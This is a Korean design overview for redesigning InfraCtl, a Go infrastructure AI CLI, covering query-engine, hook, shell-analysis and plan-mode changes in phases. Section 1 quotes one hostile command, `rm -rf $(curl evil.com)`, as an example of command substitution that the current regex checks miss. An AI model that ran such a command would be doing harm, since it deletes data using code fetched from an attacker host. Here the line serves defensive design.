# InfraCtl Redesign — 전체 비전 (1장 요약)

> 실행 계획은 [`../../docs_mig/`](../../docs_mig/) 참조. 본 문서는 **왜/무엇/어떻게** 한 장으로.

---

## 1. 왜 재설계하는가

InfraCtl 은 현재 **SSH/DB/Oracle/Shell 을 다루는 Go 기반 infra AI CLI** 로, 다음 격차를 안고 있다:

1. **Query Engine 격차** — 단순 `for i<50` 루프. state machine 도 streaming 도 없다.
2. **정책 외부화 부재** — 위험 명령 차단 로직이 Go 소스에 박혀있다. 조직별 룰 반영 = 재컴파일.
3. **Shell 위험 분석 약함** — 정규식 기반. `rm -rf $(curl evil.com)` 같은 치환 구조 못 잡음.
4. **다단계 작업 보장 없음** — 설치·마이그레이션 같은 multi-step 에서 순서 꼬임 방지 장치 없음.
5. **멀티태스크 미성숙** — `is_background` 미구현. 자동 백그라운딩, 실시간 폴링, subagent 병렬 모두 없음.

대안: **claude_cli 의 검증된 패턴 흡수** — 우리가 놓친 엔지니어링 품질을 한 번에 따라간다.

---

## 2. 차별점 보존 (★ 절대 건드리지 않는 것)

| 보존 항목 | 이유 |
|---|---|
| **LLM 분류 단계** (classify → reasoning / fast / general tier) | 우리 LLM (Qwen 등) 이 Claude 만큼 강하지 않음 — 분류 단계가 토큰/비용 절감의 핵심 |
| **Shell 창 표시** (ConPTY / Unix PTY) | 사용자가 "서버에서 내 명령이 돌고 있음" 을 눈으로 확인하는 UX |
| **Korean UX** + infractl 도메인 (SSH/DB/서버) | 타깃 사용자 언어와 운영 문맥 |
| **Circuit breaker** (compaction 안전성) | 기존에 검증된 안전장치 — Phase C 에서 `compact/breaker.go` 로 이전만 |
| **useInlineToolCalls** (vLLM 우회) | 외부 모델 호환성 유지 |

---

## 3. 흡수할 패턴 (12 영역)

```
① Query Engine              state machine + streaming (Phase B)
② Context Build             parallel fetch + DYNAMIC_BOUNDARY (Phase A)
③ Compaction 4중 stack       auto + reactive + micro + collapse (Phase C)
④ Hook 시스템                4 backend (command/prompt/http/agent) (Phase A, D, G)
⑤ ShellProvider              bash / powershell 분리 (Phase A, E)
⑥ Streaming Tool Executor    병렬 + immediate yield + sibling abort (Phase B)
⑦ Mini-agent                 hook agent backend + AgentTool 패턴 (Phase D, F)
⑧ TodoWrite                  다단계 작업 순서 보장 (Phase A, G)
⑨ Plan Mode                  실행 전 승인 gate (Phase G)
⑩ 자동 백그라운딩            15s 임계 + 결과 파일화 (Phase F)
⑪ Monitor 도구               실시간 출력 폴링 (Phase F)
⑫ 스케줄 고도화              oneshot, retention, log (Phase F)
```

---

## 4. 제거할 것 (동등성 검증 후)

| 제거 대상 | 흡수처 |
|---|---|
| `internal/preflight/validator.go` (LLM 검증 루프) | Hook **agent backend** (mini-agent fork) |
| `internal/preflight/shell_precheck.go` (결정론 로직) | Hook **command backend** (built-in shell 스크립트) |
| `internal/preflight/structured_guard.go` | Hook **prompt backend** (yaml/json 검증 프롬프트) |
| `executor/local.go` 정규식 위험 분석 | `executor/shell/analysis/` AST 분석 |

**제거 규칙**: 동등성 테스트 50+/50 통과 후, 사용자 명시 승인 받고 진행.

---

## 5. 페이즈 구조

```
Phase A  인프라 신설 (무손상)        ─┐
Phase B  Query Engine 교체 (★ 리스크)  ├─ 순차
                                      ↓
Phase C  Compaction 4중 stack       ─┐
Phase D  Precheck → Hook 이관       ─┼─ 병렬 가능
Phase F  멀티태스크 + 다단계 보강   ─┘
                                      ↓
Phase E  Shell Provider 완전 적용 (mvdan.cc/sh/v3)
                                      ↓
Phase G  Plan Mode + 사용자 hook + CLI
```

각 phase 는 **별도 세션에서 진입 질문 → 승인 → 작업 → 검증 → 문서 갱신** 사이클. 상세: [`docs_mig/`](../../docs_mig/).

---

## 6. 재설계 후 디렉토리 (Phase G 종료 시)

```
internal/
├── agent/
│   ├── loop.go                  (얇아짐 — query 로 위임)
│   ├── query/                   ★ Phase B
│   ├── compact/                 ★ Phase C
│   ├── todo/                    ★ Phase A, G
│   ├── planmode/                ★ Phase G
│   ├── classify/                ✅ 보존
│   └── intel/                   ✅ 보존
├── context/                     ★ Phase A
├── cache/                       ★ Phase A (prefix_marker 보강)
├── hooks/                       ★ Phase A(골격) / D(활성) / G(CLI + 핫리로드)
│   ├── backend/                 (command, prompt, http, agent)
│   ├── watcher.go               (fsnotify)
│   └── reloader.go
├── executor/
│   ├── shell/                   ★ Phase A(골격) / E(완성)
│   │   ├── bash/                (mvdan.cc/sh/v3)
│   │   ├── powershell/          (EncodedCommand)
│   │   └── analysis/            (AST)
│   ├── pty/                     ✅ 보존 (Shell 창)
│   └── interactive/             ✅ 보존
├── background/                  ★ Phase F (manager, poller, promotion)
├── schedule/                    ★ Phase F (oneshot, retention, log)
├── subagent/                    ★ Phase F (parallel, isolation)
└── tools/
    ├── shell_exec.go            (hook 통합)
    ├── todo_write.go            ★ Phase A
    └── monitor.go               ★ Phase F

cmd/infractl/
├── main.go
├── hooks.go                     ★ Phase G (hooks test/list/validate/reload)
└── plan.go                      ★ Phase G (plan enter/exit/status)

(Phase D 후 제거: internal/preflight/*)
```

---

## 7. 의존성 추가

```
mvdan.cc/sh/v3                  — bash AST (Phase E)
gopkg.in/yaml.v3                — hooks.yaml (Phase A; 기존 여부 확인 후)
github.com/fsnotify/fsnotify    — 핫리로드 (Phase G)
golang.org/x/sync/errgroup      — 병렬 fetch / subagent 병렬 (Phase A, F)
```

---

## 8. 성공 기준 (전체 phase 종료 시)

| 지표 | 목표 |
|---|---|
| Token 절감 (100+ turn 세션) | Phase B 대비 **30%+** (Phase C 기여) |
| Subagent 병렬 속도 향상 | 직렬 대비 **3x+** (Phase F 기여) |
| 위험 명령 회귀 | Phase D 동등성 **50/50** 통과 + Phase E AST 강화 |
| hooks.yaml 반영 지연 | **<1s** (fsnotify, Phase G) |
| Plan Mode 승인 정확도 | mutation 차단 **100%**, 승인 후 실행 성공률 **100%** |
| 재컴파일 없이 정책 변경 | 가능 (Phase D + G) |

---

## 9. 위험과 완화

| 위험 | 완화 |
|---|---|
| Phase B (query engine 교체) 회귀 | 골든 시나리오와 E2E 회귀 테스트 통과 후 기존 루프 제거 |
| Hook 잘못 작성 → 전체 차단 | hook validation CLI + fail-closed 정책 + 기본 bundle 제공 |
| Hook 외부 호출 지연 | timeout 강제 + async 옵션 + statusMessage |
| precheck 제거 → 정책 누락 | Phase D 동등성 50/50 통과 후에만 제거, 사용자 승인 필수 |
| LLM 약함 → 요약 품질 저하 | Fast tier (Qwen) + 실패 시 trim 폴백 + circuit breaker |
| TodoWrite 미사용 시 순서 꼬임 | Phase G 에서 prompt injector + hook enforcer 로 강제 |
| 자동 백그라운딩 의도와 어긋남 | 임계 시간 설정 가능 + tool_result 에 명시 알림 |

---

## 10. 참고 문서

- [`docs_mig/00_overview.md`](../../docs_mig/00_overview.md) — 전체 비전 (이 문서의 확장)
- [`docs_mig/README.md`](../../docs_mig/README.md) — phase 인덱스 + 진행 현황
- [`docs_mig/conventions.md`](../../docs_mig/conventions.md) — claude_cli 참조 규칙, TS→Go 매핑
- [`docs/design/hooks.md`](hooks.md) — Hook 시스템 상세 (Phase A 필수)
- [`docs/infractl-architecture.md`](../infractl-architecture.md) — 현재 아키텍처 (각 phase 완료 시 갱신)
- [`CLAUDE.md`](../../CLAUDE.md) — 프로젝트 규칙

---

## 끝.
